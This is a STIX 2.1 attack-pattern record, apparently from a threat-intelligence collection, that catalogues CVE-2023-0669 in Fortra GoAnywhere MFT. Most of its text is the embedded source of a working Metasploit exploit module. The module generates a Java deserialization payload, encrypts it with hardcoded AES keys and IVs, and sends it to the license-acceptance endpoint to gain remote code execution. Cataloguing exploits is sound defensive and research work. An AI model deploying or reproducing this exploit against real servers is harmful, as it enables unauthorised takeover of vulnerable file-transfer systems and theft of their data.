{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6787e48d-8b44-4713-8dc6-bb6b12bd451d",
    "created": "2024-08-14T17:09:05.536925Z",
    "modified": "2024-08-14T17:09:05.536929Z",
    "name": "Fortra GoAnywhere MFT Unsafe Deserialization RCE",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/fortra_goanywhere_rce_cve_2023_0669.rb",
            "external_id": "fortra_goanywhere_rce_cve_2023_0669.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-0669"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/mg883Nbeva/cve-2023-0669/rapid7-analysis"
        },
        {
            "source_name": "reference",
            "url": "https://frycos.github.io/vulns4free/2023/02/06/goanywhere-forgotten.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::JavaDeserialization\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Fortra GoAnywhere MFT Unsafe Deserialization RCE',\n        'Description' => %q{\n          This module exploits CVE-2023-0669, which is an object deserialization\n          vulnerability in Fortra GoAnywhere MFT.\n        },\n        'Author' => [\n          'Ron Bowes', # Analysis and module\n          'Frycos (Florian Hauser)' # Discovery and analysis\n        ],\n        'References' => [\n          ['CVE', '2023-0669'],\n          ['URL', 'https://attackerkb.com/topics/mg883Nbeva/cve-2023-0669/rapid7-analysis'],\n          ['URL', 'https://frycos.github.io/vulns4free/2023/02/06/goanywhere-forgotten.html']\n        ],\n        'DisclosureDate' => '2023-02-01',\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'win'],\n        'Arch' => [ARCH_CMD],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Version 2 Encryption',\n            {\n              'DefaultOptions' => {\n                'Version' => '$2',\n                'EncryptionKey' => '0e69a3839b6ecf45649b861f4a27171b66870c9567a4144ebaf3d52fdc4064ca',\n                'EncryptionIv' => '4145532f4342432f504b435335506164'\n              }\n            },\n          ],\n          [\n            'Version 1 Encryption',\n            {\n              'DefaultOptions' => {\n                'Version' => '',\n                'EncryptionKey' => '678b5830bf8b8a2e0474b97d6cd18e845fbc4b11fca0d6af2db1eb114c29fc4b',\n                'EncryptionIv' => '4145532f4342432f504b435335506164'\n              }\n            }\n          ],\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 8001,\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Unsafe deserialization endpoint', '/goanywhere/lic/accept']),\n    ])\n\n    register_advanced_options([\n      OptString.new('Version', [false, 'A version value to append to the encrypted data']),\n      OptString.new('EncryptionKey', [true, 'The encryption key to use (hex-encoded)'], regex: /^([a-fA-F0-9]{2})+$/),\n      OptString.new('EncryptionIv', [true, 'The initialization vector (hex-encoded)'], regex: /^([a-fA-F0-9]{2})+$/),\n      OptString.new('EncryptionAlgorithm', [true, 'The encryption algorithm', 'AES-256-CBC'])\n    ])\n  end\n\n  def build_cipher\n    unless OpenSSL::Cipher.ciphers.any? { |cipher_name| cipher_name.casecmp?(datastore['EncryptionAlgorithm']) }\n      raise Msf::OptionValidateError.new({ 'EncryptionAlgorithm' => 'The selected encryption algorithm is not supported by OpenSSL.' })\n    end\n\n    cipher = OpenSSL::Cipher.new(datastore['EncryptionAlgorithm'])\n    cipher.encrypt\n\n    option_errors = {}\n    iv = datastore['EncryptionIv'].scan(/../).map { |x| x.hex.chr }.join\n    unless cipher.iv_len == iv.length\n      option_errors['EncryptionIv'] = \"The encryption IV is not the correct length (is: #{iv.length}, should be: #{cipher.iv_len}).\"\n    end\n\n    key = datastore['EncryptionKey'].scan(/../).map { |x| x.hex.chr }.join\n    unless cipher.key_len == key.length\n      option_errors['EncryptionKey'] = \"The encryption key is not the correct length (is: #{key.length}, should be: #{cipher.key_len}).\"\n    end\n    raise Msf::OptionValidateError, option_errors unless option_errors.empty?\n\n    cipher.iv = iv\n    cipher.key = key\n    cipher\n  end\n\n  def exploit\n    vprint_status('Generating a serialized Java object with the payload')\n    obj = generate_java_deserialization_for_payload('CommonsBeanutils1', payload)\n\n    vprint_status('Encrypting the payload')\n    cipher = build_cipher\n    obj = cipher.update(obj) + cipher.final\n\n    vprint_status('Sending request to the server')\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => datastore['TARGETURI'],\n      'vars_post' => {\n        'bundle' => \"#{Base64.urlsafe_encode64(obj)}#{datastore['Version'] || ''}\"\n      }\n    )\n\n    fail_with(Failure::Unreachable, 'No response received from the target.') unless res\n    if res.code != 500\n      fail_with(Failure::UnexpectedReply, \"Expected the server to return HTTP/500, instead received HTTP/#{res.code}\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2023-02-01",
    "x_mitre_platforms": [
        "['unix', 'win']"
    ]
}